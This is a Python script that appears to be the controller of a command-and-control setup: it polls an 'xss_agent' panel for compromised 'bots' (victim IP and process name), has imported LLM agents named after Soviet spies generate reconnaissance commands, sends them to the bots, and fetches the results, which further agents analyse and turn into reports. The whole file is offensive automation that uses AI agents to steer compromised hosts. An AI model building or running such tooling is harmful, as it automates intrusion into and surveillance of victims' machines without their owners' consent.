from Boris_Bazarov_agent import run_boris_agent
from Iskhak_Akhmerov_agent import run_iskhak_agent
from Rudolf_Abel_agent import run_rudolf_agent

import requests
import time

recon_agent_name = "Rudolf Abel"
sr_agent_name = "Boris Bazarov"
data_agent_name = "Iskhak Akhmerov"

def send_cmd(id, bot_name, result_content):
    url = "http://webserver/panel/xss_agent/endpoint/agents/send_commands.php"
    payload = {
        "bot_id": id,
        "agent_name": recon_agent_name,
        "bot_name": bot_name,
        "cmd_sent": result_content
    }

    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Result sent successfully.")
    else:
        print(f"Failed to send result: {response.status_code} - {response.text}")

def get_result(bot_id):
    url = "http://webserver/panel/xss_agent/endpoint/agents/get_results.php"
    payload = {
        "bot_id": bot_id
    }

    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to get results: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        raise Exception(f"Request failed: {e}")

def send_final_report(bot_id, bot_name, agent_name, sr_content):
    url = "http://webserver/panel/xss_agent/endpoint/agents/sreport.php"
    payload = {
        "bot_id": bot_id,
        "bot_name": bot_name,
        "agent_name": agent_name,
        "sr_content": sr_content
    }

    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Final report sent successfully.")
    else:
        print(f"Failed to send final report: {response.status_code} - {response.text}")

def send_analysis_result(bot_name, analysis_result, agent_name):
    url = "http://webserver/panel/xss_agent/endpoint/agents/data_analysis_result.php"
    payload = {
        "bot_name": bot_name,
        "analysis_result": analysis_result,
        "agent_name": agent_name
    }

    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Analysis result sent successfully.")
    else:
        print(f"Failed to send analysis result: {response.status_code} - {response.text}")

def main():
    url = "http://webserver/panel/xss_agent/endpoint/agents/v1.php"
    wait_time = 1

    while True:
        try:
            response = requests.post(url)

            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'success':
                        post_data = data['data']
                        id = post_data.get("id")
                        bot_name = post_data.get("name")
                        ip_address = post_data.get("ip_address")
                        process_name = post_data.get("process_name")

                        recon_cmd = run_rudolf_agent()
                        print(recon_cmd)

                        send_cmd(id, bot_name, str(recon_cmd))

                        # Sleep for 5 seconds
                        time.sleep(5)

                        # Send the request to capture the results using only the bot_id
                        result = get_result(id)
                        
                        # Convert recon_data to a string
                        recon_data = str(result) if isinstance(result, (dict, list)) else result

                        analysis_result = run_iskhak_agent(recon_data)
                        print(analysis_result)

                        # Send the analysis result along with the bot name and agent name
                        send_analysis_result(bot_name, str(analysis_result), data_agent_name)

                        final_report = run_boris_agent(recon_data + str(analysis_result))
                        print(final_report)

                        # Send the final report with the required parameters
                        send_final_report(id, bot_name, sr_agent_name, str(final_report))

                    else:
                        print(f"Error: {data.get('message')}")
                except ValueError:
                    print("Response is not in JSON format.")
            else:
                print(f"Error: {response.status_code} - {response.text}")

        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

        time.sleep(wait_time)

if __name__ == "__main__":
    main()


    